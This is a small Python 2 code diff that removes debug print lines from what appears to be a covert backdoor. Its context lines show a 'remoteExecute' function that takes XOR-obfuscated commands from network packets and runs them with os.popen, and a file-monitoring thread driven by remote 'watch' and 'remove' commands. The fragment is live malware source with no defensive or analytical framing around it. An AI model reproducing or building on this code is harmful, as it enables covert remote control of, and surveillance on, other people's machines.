@@ -171,8 +171,6 @@ def remoteExecute(packet):
                 if cmd.startswith('watch') or cmd.startswith('remove') or cmd.startswith('twatch') or cmd.startswith('list'):
                     watch_queue.put(cmd)
                     other_dest = packet[0][1].src
-                    print packet[0][1].src
-                    print other_dest
                 else:
                     decrypt_command = os.popen(xor_crypt(command))
                     command_result = decrypt_command.read()
@@ -423,7 +421,6 @@ def fileMonitor(watch, q):
         try:
             new_watch = q.get(True, 1)
             x, y = new_watch.split(' ')
-            print x, y
             if x == 'watch':
                 print 'Adding:', y
                 monitor_list[y] = wm.add_watch(y, MASK, rec=True, auto_add=True)
